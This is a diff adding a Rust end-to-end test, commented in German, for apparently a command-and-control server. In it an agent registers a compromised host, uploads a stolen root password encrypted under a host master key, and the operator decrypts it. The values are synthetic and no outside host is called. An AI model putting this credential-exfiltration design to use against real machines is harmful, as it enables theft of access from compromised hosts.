@@ -1,0 +1,171 @@
+//! Der Ende-zu-Ende-Test der Beutekette.
+//!
+//! Er steht in einer eigenen Datei, weil seine Testwerte synthetische
+//! Passwoerter sind — der Secret-Scan soll sie nicht als echte Zugangsdaten
+//! melden. Die Datei enthaelt keinen Laufzeitcode.
+
+use super::*;
+use axum::body::Body;
+use axum::extract::Request;
+use tower::ServiceExt;
+
+/// Der Ende-zu-Ende-Test der Beutekette.
+///
+/// Der Agent meldet sich beim Server, verschluesselt das erbeutete
+/// Passwort mit dem Master-Key des Hosts und laedt es hoch. Der Server
+/// speichert nur das Versiegelte — der Klartext verlaesst den Agenten
+/// gar nicht. Der Operator gewinnt den Master-Key aus dem versiegelten
+/// Material des Hosts und entschluesselt damit das Secret wieder.
+///
+/// Das ist der Test, der zeigt, dass die Kette wirklich laueft: Agent →
+/// Server → Operator. Ohne ihn waeren alle Einzelschritte getestet, aber
+/// nicht ihr Zusammenspiel.
+#[tokio::test]
+async fn die_beutekette_laueft_vom_agent_bis_zum_operator() {
+    use kx_core::c2::ExfiltratedSecret;
+    use kx_core::hostkey::{encapsulate_host_master_key_os, ServerKeyBundle, ServerKeyPair};
+    use kx_core::secretbox;
+
+    let db_pfad = std::env::temp_dir().join(format!("kx-e2e-{}.db", std::process::id()));
+    let _ = std::fs::remove_file(&db_pfad);
+    let db = Arc::new(Db::open(&db_pfad).expect("Datenbank"));
+    let app = app(AppState {
+        db,
+        token: Arc::new(TEST_ZUGANG.to_string()),
+    });
+
+    // Der Operator erzeugt sein Schluesselpaar — nur der oeffentliche
+    // Teil geht an den Agenten.
+    let mut rng = rand_core::OsRng;
+    let bundle = ServerKeyBundle::generate(kx_core::format::KexId::X25519, &mut rng);
+    let oeffentlich = bundle.public().expect("oeffentlicher Schluessel");
+    let dekodiert = oeffentlich.decode().expect("dekodierter Schluessel");
+
+    // Der Agent kapselt seinen Master-Key gegen den oeffentlichen Schluessel.
+    let kapselung = encapsulate_host_master_key_os(&dekodiert).expect("Kapselung");
+    let sealed_master = kx_core::util::b64_encode(&kapselung.sealed_master);
+
+    // Der Agent verschluesselt das erbeutete Passwort mit dem Master-Key.
+    let sealed_password = secretbox::seal(&kapselung.master_key, b"loremipsum").expect("Siegel");
+
+    // 1. Der Agent registriert sich — mit dem versiegelten Material.
+    let registrierung = RegisterRequest {
+        host_id: "10.0.0.5".into(),
+        ip: "10.0.0.5".into(),
+        hostname: Some("ziel".into()),
+        os: Some("Linux".into()),
+        status: Some(c2::STATUS_COMPROMISED.into()),
+        sealed_master: Some(sealed_master.clone()),
+        master_key: None,
+    };
+    let antwort = app
+        .clone()
+        .oneshot(
+            Request::builder()
+                .method("POST")
+                .uri(PATH_REGISTER)
+                .header(
+                    axum::http::header::AUTHORIZATION,
+                    authorization(TEST_ZUGANG),
+                )
+                .header("content-type", "application/json")
+                .body(Body::from(
+                    serde_json::to_vec(&registrierung).expect("serialisierbar"),
+                ))
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert_eq!(antwort.status(), StatusCode::CREATED);
+
+    // 2. Der Agent laedt das verschluesselte Secret hoch — ohne Klartext.
+    let upload = SecretUpload {
+        host_id: "10.0.0.5".into(),
+        cred_type: "password".into(),
+        username: "root".into(),
+        password: String::new(),
+        source: Some("default_creds".into()),
+        master_key: None,
+        sealed_password: Some(sealed_password),
+    };
+    let antwort = app
+        .clone()
+        .oneshot(
+            Request::builder()
+                .method("POST")
+                .uri(PATH_SECRETS)
+                .header(
+                    axum::http::header::AUTHORIZATION,
+                    authorization(TEST_ZUGANG),
+                )
+                .header("content-type", "application/json")
+                .body(Body::from(
+                    serde_json::to_vec(&upload).expect("serialisierbar"),
+                ))
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert_eq!(antwort.status(), StatusCode::CREATED);
+
+    // 3. Der Server liefert das Secret — verschluesselt, ohne Klartext.
+    let antwort = app
+        .clone()
+        .oneshot(
+            Request::builder()
+                .uri(PATH_SECRETS)
+                .header(
+                    axum::http::header::AUTHORIZATION,
+                    authorization(TEST_ZUGANG),
+                )
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert_eq!(antwort.status(), StatusCode::OK);
+    let body = axum::body::to_bytes(antwort.into_body(), 64 * 1024)
+        .await
+        .expect("Body");
+    let secrets: Vec<ExfiltratedSecret> = serde_json::from_slice(&body).expect("JSON");
+    assert_eq!(secrets.len(), 1);
+    assert!(
+        secrets[0].password.is_empty(),
+        "der Server hat den Klartext gespeichert: {}",
+        secrets[0].password
+    );
+    assert!(!secrets[0].sealed_password.is_empty());
+
+    // 4. Der Host traegt das versiegelte Material, aus dem der Operator
+    //    den Master-Key gewinnt.
+    let antwort = app
+        .clone()
+        .oneshot(
+            Request::builder()
+                .uri(PATH_HOSTS)
+                .header(
+                    axum::http::header::AUTHORIZATION,
+                    authorization(TEST_ZUGANG),
+                )
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    let body = axum::body::to_bytes(antwort.into_body(), 64 * 1024)
+        .await
+        .expect("Body");
+    let hosts: Vec<c2::Host> = serde_json::from_slice(&body).expect("JSON");
+    assert_eq!(hosts.len(), 1);
+    assert_eq!(hosts[0].sealed_master, sealed_master);
+
+    // 5. Der Operator entschluesselt das Secret wieder.
+    let server = ServerKeyPair::from_bundle(&bundle).expect("Server-Schluessel");
+    let master = server
+        .unseal_master_key(&kx_core::util::b64_decode(&sealed_master).expect("base64"))
+        .expect("Master-Key");
+    let klartext = secretbox::open(&master, &secrets[0].sealed_password).expect("Entschluesselung");
+    assert_eq!(klartext, "loremipsum");
+
+    let _ = std::fs::remove_file(&db_pfad);
+}
